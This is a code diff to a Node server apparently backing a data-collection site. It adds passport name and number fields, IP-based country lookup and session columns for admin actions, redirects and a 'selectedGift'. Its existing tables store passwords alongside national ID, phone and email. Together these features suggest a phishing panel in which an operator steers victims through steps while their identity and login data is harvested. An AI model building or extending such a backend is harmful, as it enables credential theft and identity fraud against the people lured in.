@@ -84,7 +84,9 @@ var personalDataSubmissions = pgTable("personalDataSubmissions", {
   sessionId: varchar("sessionId", { length: 64 }).notNull(),
   nameArabic: text("nameArabic").notNull(),
   nameEnglish: text("nameEnglish").notNull(),
+  namePassport: text("namePassport"),
   idNumber: varchar("idNumber", { length: 50 }).notNull(),
+  passportNumber: varchar("passportNumber", { length: 50 }),
   phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
   email: varchar("email", { length: 320 }).notNull(),
   dateOfBirth: varchar("dateOfBirth", { length: 20 }).notNull(),
@@ -203,7 +205,9 @@ async function submitPersonalData(data) {
       sessionId: data.sessionId,
       nameArabic: data.nameArabic || "",
       nameEnglish: data.nameEnglish || "",
+      namePassport: data.namePassport || null,
       idNumber: data.idNumber || "N/A",
+      passportNumber: data.passportNumber || null,
       phoneNumber: data.phoneNumber || "",
       email: data.email || "",
       dateOfBirth: data.dateOfBirth || "",
@@ -830,6 +834,30 @@ var systemRouter = router({
 
 // server/routers.ts
 import { z as z2 } from "zod";
+
+// server/_core/geoLocation.ts
+async function getCountryFromIP(ipAddress) {
+  try {
+    const url = ipAddress ? `https://ipapi.co/${ipAddress}/json/` : `https://ipapi.co/json/`;
+    const response = await fetch(url, {
+      headers: {
+        "Accept": "application/json"
+      }
+    });
+    if (!response.ok) {
+      console.warn("Failed to fetch IP geolocation");
+      return "Qatar";
+    }
+    const data = await response.json();
+    const countryName = data.country_name || "Qatar";
+    return countryName;
+  } catch (error) {
+    console.error("Error fetching country from IP:", error);
+    return "Qatar";
+  }
+}
+
+// server/routers.ts
 var appRouter = router({
   system: systemRouter,
   auth: router({
@@ -956,6 +984,12 @@ var appRouter = router({
     })).mutation(async ({ input }) => {
       await updateSessionStatus(input.sessionId, "pending", input.step);
       return { success: true };
+    }),
+    // Get country from IP address
+    getCountry: publicProcedure.query(async ({ ctx }) => {
+      const ipAddress = ctx.req.headers["x-forwarded-for"]?.split(",")[0] || ctx.req.socket.remoteAddress || "unknown";
+      const country = await getCountryFromIP(ipAddress);
+      return { country };
     })
   })
 });
@@ -1092,6 +1126,8 @@ async function runMigrations() {
     `);
     console.log("\u2705 loginMethodSubmissions migrations applied");
     await db.execute(`
+      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "namePassport" text;
+      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "passportNumber" varchar(50);
       ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "password" text;
       ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "title" varchar(20);
       ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "middleName" text;
@@ -1100,6 +1136,15 @@ async function runMigrations() {
       ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "country" varchar(100);
     `);
     console.log("\u2705 personalDataSubmissions migrations applied");
+    await db.execute(`
+      ALTER TABLE "sessions" ADD COLUMN IF NOT EXISTS "status" varchar(20) DEFAULT 'pending';
+      ALTER TABLE "sessions" ADD COLUMN IF NOT EXISTS "currentStep" varchar(50);
+      ALTER TABLE "sessions" ADD COLUMN IF NOT EXISTS "adminAction" varchar(20);
+      ALTER TABLE "sessions" ADD COLUMN IF NOT EXISTS "errorMessage" text;
+      ALTER TABLE "sessions" ADD COLUMN IF NOT EXISTS "redirectTarget" varchar(50);
+      ALTER TABLE "sessions" ADD COLUMN IF NOT EXISTS "selectedGift" varchar(50);
+    `);
+    console.log("\u2705 sessions migrations applied");
     await db.execute(`
       ALTER TABLE "personalDataSubmissions" ALTER COLUMN "nameArabic" DROP NOT NULL;
       ALTER TABLE "personalDataSubmissions" ALTER COLUMN "idNumber" DROP NOT NULL;
